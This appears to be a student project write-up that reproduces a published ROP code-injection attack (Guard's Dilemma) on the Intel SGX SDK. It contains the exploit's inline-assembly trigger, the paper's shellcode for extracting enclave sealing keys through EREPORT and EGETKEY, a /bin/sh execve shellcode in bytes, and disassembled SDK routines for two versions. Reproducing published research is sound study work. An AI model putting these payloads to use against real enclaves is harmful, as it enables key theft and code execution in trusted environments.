# This is the Final Product

## How Attack Works
The paper introduces two attacks, ORET-CONT loop and CONT loop. asm_oret is a function that restores some registers and is used to switch context after an OCALL. continue_execution is a function that restores all general purpose registers after an exception. 

This project uses the CONT loop.
Using the CONT loop, the attack uses a write gadget, which is part of "do_rdrand".
```
    mov dword ptr [rcx], eax
    mov eax, 1
    ret
```
Using ROPgadget or just reading the enclave.signed.io we can get addresses of asm_oret, continue_execution, and write gadget. 

The initial attack is conducted by calling the continue_execution using:
```
__asm__(
        "mov %0, %%rdi\n"
        "call %1\n"
        : // no output
        : "r" (tmp), "r" (addr)
        : "rdi"
    );
```
Which sets the rdi to the crafted context (register values we want to plant into the system) and calls continue_execution. This part is primitive but there are multiple ways to call continue_execution. 

### Ways to call continue_execution
To call continue execution you need two things. Control over the rdi register (to pass the crafted context) and the rip register (since we need to call this function). Any memory vulnerability that allows this can be used. 

Paper introduces the use of asm_oret to do this. To use asm_oret we only need buffer overflow. Paper states to overflow the return address to the address of asm_oret followed by the crafted context for oret to use (which will carry the rdi value for continue_execution and the stack will probably end with address of continue execution to start the ORET-CONT loop). 

the ORET-CONT loop allows asm_oret to call continue_execution. continue_execution will call the gadget and since continue_execution controls the rsp, asm_oret can be called after the gadget. 

### After continue_execution

One distinct part of this attack is that we need some structures (crafted stack and context) within the memory accessible to the enclave. This does not require this structure to be within trusted memory as enclave has access to untrusted memory. To do this structure is written within the application code. 

The stack is filled with the address to continue_execution. And cpu_context is crafted containing a rflag (not setting rflag seem to trigger Trace/Breakpoint signal) to 530. rax is set to the 4 bytes of code to be written and rcx points to the destination to write the code.

The paper becomes rather vague about this destination. Basically the write gadget is used to write code into this area and continue execution will execute the code by changing the rip to the first instruction of injected code. 

So this is basically a ROP based code injection displaying the Guards Dilemma where SGX SDK is tricked by the attacker to inject and execute malicious code. (In that sense we cover a lot of things we saw in this class)

### The injected code

For sake of simplicity the code is injected into the stack. That is the fake stack we created. There are two injected codes one is commented out because it doesn't work. This is due to the 'enclu' instruction. This instruction is specifically for SGX CPU regarding enclaves. 

### Injected Code #1 (commented out) Remote Attestation Attack

The benefit of this attack is the ROP code is executed within the enclave. This allows the attacker to attack remote attestation and act as if they are the enclave. This shell code is introduced within the paper. The bytes are successfully printed into the stack however it is not disassembled properly (due to enclu).

Code injection can be done on application level however this attack displays how much power continue_execution gives to the attacker. Not only do we control return address like a traditional buffer overflow based ROP but we control every general purpose register. 

The shell code introduced in the paper:
```
### Initial register state :
### rax = 0 ( EREPORT leaf )
### rbx = EEXIT return address
### rcx = 512+512+64
### ( total size of structures )
### rdx = writable 512 - byte aligned enclave
### area for temporary data
### rdi = writable 512 - byte aligned enclave
### area to copy structures into
### rsi = address of attacker ’s KEYREQUEST +
### TARGETINFO + REPORTDATA
### rbp = address of attacker ’s key buffer
### rsp = writable area for shellcode stack
push rbx
push rdi
### Copy KEYREQUEST , TARGETINFO ,
### REPORTDATA to enclave memory
rep movsb
### EREPORT
lea rcx , [ rdi -64]
lea rbx , [ rcx -512]
enclu
### Copy report ’s ISVSVN to KEYREQUEST
pop rbx
mov ax , [ rdx +258]
mov [ rbx +4] , ax
### Copy report ’s CPUSVN to KEYREQUEST
vmovdqa xmm0 , [ rdx ]
vmovdqu [ rbx +8] , xmm0
### Copy report ’s KEYID to KEYREQUEST
vmovdqa ymm0 , [ rdx +384]
vmovdqu [ rbx +40] , ymm0
### EGETKEY
push rdx
pop rcx
mov al , 1
enclu
### Copy key to attacker ’s memory
movdqa xmm0 , [ rdx ]
movdqu [ rbp ], xmm0
### EEXIT to attacker ’s code
pop rbx
mov al , 4
enclu

```

### Injected Code #2 Shell (tested on Ubuntu 20.04 VM and Ubuntu 18 Server Azure)

To test the injection and execution of code we used basic shell code.

```
            6a 42                   push   0x42
            58                      pop    rax
            fe c4                   inc    ah
            48 99                   cqo
            52                      push   rdx
            48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
            2f 73 68
            57                      push   rdi
            54                      push   rsp
            5e                      pop    rsi
            49 89 d0                mov    r8, rdx
            49 89 d2                mov    r10, rdx
            0f 05                   syscall
```
This can be done without using enclave. Actually it can be done easier that way however the purpose of this is to present how we can control registers to inject code and execute them (like done in the paper).

# SGX 1.6
The SGX 1.6 is the lowest version available in Linux-IntelSGX github. The paper discusses this version and other post 2.0 versions and there differences in implementing key functions such as asm_oret and continue_execution.

### asm_oret (sgx1.6)
   0x7fe0a5ad7c17:	mov    %rdi,%rsp
   0x7fe0a5ad7c1a:	mov    %rsi,%rax
   0x7fe0a5ad7c1d:	mov    0x38(%rsp),%r15
   0x7fe0a5ad7c22:	mov    0x40(%rsp),%r14
   0x7fe0a5ad7c27:	mov    0x48(%rsp),%r13
   0x7fe0a5ad7c2c:	mov    0x50(%rsp),%r12
   0x7fe0a5ad7c31:	mov    0x58(%rsp),%rbp
   0x7fe0a5ad7c36:	mov    0x60(%rsp),%rdi
   0x7fe0a5ad7c3b:	mov    0x68(%rsp),%rsi
   0x7fe0a5ad7c40:	mov    0x70(%rsp),%rbx
   0x7fe0a5ad7c45:	add    $0x98,%rsp
   0x7fe0a5ad7c4c:	retq 

### continue_execution (sgx1.6)
   0x7fe0a5ad7cee:	mov    %rdi,%rcx
   0x7fe0a5ad7cf1:	mov    0x20(%rcx),%rdx
   0x7fe0a5ad7cf5:	mov    %rdx,%rsp
   0x7fe0a5ad7cf8:	sub    $0x8,%rsp
   0x7fe0a5ad7cfc:	mov    0x88(%rcx),%rax
   0x7fe0a5ad7d03:	mov    %rax,(%rsp)
   0x7fe0a5ad7d07:	mov    (%rcx),%rax
   0x7fe0a5ad7d0a:	mov    0x10(%rcx),%rdx
   0x7fe0a5ad7d0e:	mov    0x18(%rcx),%rbx
   0x7fe0a5ad7d12:	mov    0x28(%rcx),%rbp
   0x7fe0a5ad7d16:	mov    0x30(%rcx),%rsi
   0x7fe0a5ad7d1a:	mov    0x38(%rcx),%rdi
   0x7fe0a5ad7d1e:	mov    0x40(%rcx),%r8
   0x7fe0a5ad7d22:	mov    0x48(%rcx),%r9
   0x7fe0a5ad7d26:	mov    0x50(%rcx),%r10
   0x7fe0a5ad7d2a:	mov    0x58(%rcx),%r11
   0x7fe0a5ad7d2e:	mov    0x60(%rcx),%r12
   0x7fe0a5ad7d32:	mov    0x68(%rcx),%r13
   0x7fe0a5ad7d36:	mov    0x70(%rcx),%r14
   0x7fe0a5ad7d3a:	mov    0x78(%rcx),%r15
   0x7fe0a5ad7d3e:	pushq  0x80(%rcx)
   0x7fe0a5ad7d44:	popfq  
   0x7fe0a5ad7d45:	mov    0x8(%rcx),%rcx
   0x7fe0a5ad7d49:	retq  
 
# SGX 2.18
The SGX 2.18 is the latest available in Linux-IntelSGX github. Attack does not work for this version. Maybe further investigation can be done as to why it doesn't work and how Intel has patched the SGX-SDK after release of papers such as Guard's Dilemma and SnakeGX. 

## asm_oret (sgx2.18)

```
0000000000036ab8 <asm_oret>:
   36ab8:       48 89 e3                mov    %rsp,%rbx
   36abb:       48 89 7c 24 08          mov    %rdi,0x8(%rsp)
   36ac0:       48 89 74 24 10          mov    %rsi,0x10(%rsp)
   36ac5:       48 8b 63 08             mov    0x8(%rbx),%rsp
   36ac9:       48 8b bc 24 98 00 00    mov    0x98(%rsp),%rdi
   36ad0:       00 
   36ad1:       e8 02 fd ff ff          call   367d8 <restore_xregs>
   36ad6:       0f ae e8                lfence 
   36ad9:       48 31 c0                xor    %rax,%rax
   36adc:       48 8b 4c 24 58          mov    0x58(%rsp),%rcx
   36ae1:       48 29 f9                sub    %rdi,%rcx
   36ae4:       48 83 e9 08             sub    $0x8,%rcx
   36ae8:       48 c1 e9 02             shr    $0x2,%rcx
   36aec:       fc                      cld    
   36aed:       f3 ab                   rep stos %eax,%es:(%rdi)
   36aef:       48 8b 43 10             mov    0x10(%rbx),%rax
   36af3:       4c 8b 7c 24 38          mov    0x38(%rsp),%r15
   36af8:       4c 8b 74 24 40          mov    0x40(%rsp),%r14
   36afd:       4c 8b 6c 24 48          mov    0x48(%rsp),%r13
   36b02:       4c 8b 64 24 50          mov    0x50(%rsp),%r12
   36b07:       48 8b 6c 24 58          mov    0x58(%rsp),%rbp
   36b0c:       48 8b 7c 24 60          mov    0x60(%rsp),%rdi
   36b11:       48 8b 74 24 68          mov    0x68(%rsp),%rsi
   36b16:       48 8b 5c 24 70          mov    0x70(%rsp),%rbx
   36b1b:       48 89 ec                mov    %rbp,%rsp
   36b1e:       5d                      pop    %rbp
   36b1f:       c3                      ret
   36b20:       0f 0b                   ud2
```

## continue_execution (sgx2.18)

```
0000000000036bec <continue_execution>:
   36bec:       48 89 f9                mov    %rdi,%rcx
   36bef:       48 8b 01                mov    (%rcx),%rax
   36bf2:       50                      push   %rax
   36bf3:       48 8b 41 08             mov    0x8(%rcx),%rax
   36bf7:       50                      push   %rax
   36bf8:       48 8b 41 20             mov    0x20(%rcx),%rax
   36bfc:       48 2d 88 00 00 00       sub    $0x88,%rax
   36c02:       48 8b 51 10             mov    0x10(%rcx),%rdx
   36c06:       48 8b 59 18             mov    0x18(%rcx),%rbx
   36c0a:       48 8b 69 28             mov    0x28(%rcx),%rbp
   36c0e:       48 8b 71 30             mov    0x30(%rcx),%rsi
   36c12:       48 8b 79 38             mov    0x38(%rcx),%rdi
   36c16:       4c 8b 41 40             mov    0x40(%rcx),%r8
   36c1a:       4c 8b 49 48             mov    0x48(%rcx),%r9
   36c1e:       4c 8b 51 50             mov    0x50(%rcx),%r10
   36c22:       4c 8b 59 58             mov    0x58(%rcx),%r11
   36c26:       4c 8b 61 60             mov    0x60(%rcx),%r12
   36c2a:       4c 8b 69 68             mov    0x68(%rcx),%r13
   36c2e:       4c 8b 71 70             mov    0x70(%rcx),%r14
   36c32:       4c 8b 79 78             mov    0x78(%rcx),%r15
   36c36:       ff b1 80 00 00 00       push   0x80(%rcx)
   36c3c:       9d                      popf   
   36c3d:       48 8b 89 88 00 00 00    mov    0x88(%rcx),%rcx
   36c44:       48 89 08                mov    %rcx,(%rax)
   36c47:       59                      pop    %rcx
   36c48:       5c                      pop    %rsp
   36c49:       48 94                   xchg   %rax,%rsp
   36c4b:       c2 80 00                ret    $0x80
```